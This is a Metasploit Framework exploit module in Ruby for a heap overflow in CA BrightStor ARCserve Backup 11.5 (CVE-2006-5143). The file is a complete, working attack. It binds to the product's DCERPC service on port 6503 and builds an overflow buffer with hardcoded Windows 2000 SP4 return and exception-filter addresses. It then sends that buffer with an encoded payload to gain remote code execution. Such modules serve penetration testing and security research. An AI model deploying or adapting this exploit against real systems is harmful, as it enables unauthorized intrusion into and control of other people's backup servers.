##
# $Id: message_engine_heap.rb 9179 2010-04-30 08:40:19Z jduck $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = AverageRanking

	include Msf::Exploit::Remote::DCERPC

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'CA BrightStor ARCserve Message Engine Heap Overflow',
			'Description'    => %q{
					This module exploits a heap overflow in Computer Associates BrightStor ARCserve Backup
				11.5. By sending a specially crafted RPC request, an attacker could overflow the
				buffer and execute arbitrary code.
			},
			'Author'         => [ 'MC' ],
			'License'        => MSF_LICENSE,
			'Version'        => '$Revision: 9179 $',
			'References'     =>
				[
					[ 'CVE', '2006-5143' ],
					[ 'OSVDB', '29533' ],
					[ 'BID', '20365' ],
				],
			'Privileged'     => true,
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'process',
				},
			'Payload'        =>
				{
					'Space'    => 800,
					'BadChars' => "\x00\x0a\x0d\x5c\x5f\x2f\x2e",
					'StackAdjustment' => -3500,
				},
			'Platform' => 'win',
			'Targets'  =>
				[
					['Windows 2000 SP4 English',   { 'Ret' => 0x7c2f6cc8, 'UEF' => 0x7c54144c } ],
				],
			'DisclosureDate' => 'Oct 05 2006',
			'DefaultTarget' => 0))

		register_options(
			[
				Opt::RPORT(6503)
			], self.class)
	end

	def exploit
		connect

		handle = dcerpc_handle('dc246bf0-7a7a-11ce-9f88-00805fe43838', '1.0', 'ncacn_ip_tcp', [datastore['RPORT']])
		print_status("Binding to #{handle} ...")

		dcerpc_bind(handle)
		print_status("Bound to #{handle} ...")

		# straight forward heap stuffz
		sploit =  make_nops(680) + "\xeb\x0a" + make_nops(2) + [ target.ret ].pack('V')
		sploit << [ target['UEF'] ].pack('V') + payload.encoded

		print_status("Trying target #{target.name}...")

			begin
				dcerpc_call(43, sploit)
				rescue Rex::Proto::DCERPC::Exceptions::NoResponse
			end

		handler
		disconnect
	end

end